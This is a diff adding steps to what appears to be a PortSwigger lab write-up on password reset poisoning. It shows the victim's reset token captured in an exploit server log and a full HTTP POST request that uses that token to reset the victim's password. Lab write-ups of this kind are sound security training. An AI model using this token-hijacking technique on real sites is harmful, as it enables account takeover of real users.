@@ -125,7 +125,45 @@ username=carlos
 ```
 
 
-Since it is given in the lab description that **user carlos will carelessly click on any links in emails that he receives**. It means he will enter his username and password for resetting his old password by clicking on our malicious link.
+Since it is given in the lab description that **user carlos will carelessly click on any links in emails that he receives**. It means he will click the link to access the forgot password page.
+
+As guessed, we can see in the `access log` of our exploit server, the user carlos had indeed clicked the link & we've got a *GET request to /forgot-password* page which contains **carlos's token** - `Nfrrsdma8tQoaei2fh79q5H90VMtE4gX`.  
+
+![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/963b2c5f-2f9b-44c8-9693-4f6feae64e7b)
+
+Now modify the *POST request to /forgot-password which had the token of user wiener*, change the token value to `Nfrrsdma8tQoaei2fh79q5H90VMtE4gX` (carlos's token) in both url and in body of ther request.
+
+```http
+POST /forgot-password?temp-forgot-password-token=Nfrrsdma8tQoaei2fh79q5H90VMtE4gX HTTP/2
+Host: 0a2a008c04ea5e04811420c2002d00da.web-security-academy.net
+Cookie: session=anHQWEif1S7SLaCMKg0aHmQua1UmqfuG
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 105
+Origin: https://0a2a008c04ea5e04811420c2002d00da.web-security-academy.net
+Referer: https://0a2a008c04ea5e04811420c2002d00da.web-security-academy.net/forgot-password?temp-forgot-password-token=olTcYZZvrY685nbSMG6vkdvD5n21IreA
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+
+temp-forgot-password-token=Nfrrsdma8tQoaei2fh79q5H90VMtE4gX&new-password-1=newpass&new-password-2=newpass
+```
+
+**Our guess is that probably the password of carlos is now reset to `newpass` since we got the token value & replaced it with carlos's token.**
+
+Lets verify it by logging in.
+
+![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/a3cd8aff-699c-4039-bff0-62d9567760ae)
+
+
+
+
 
 
 
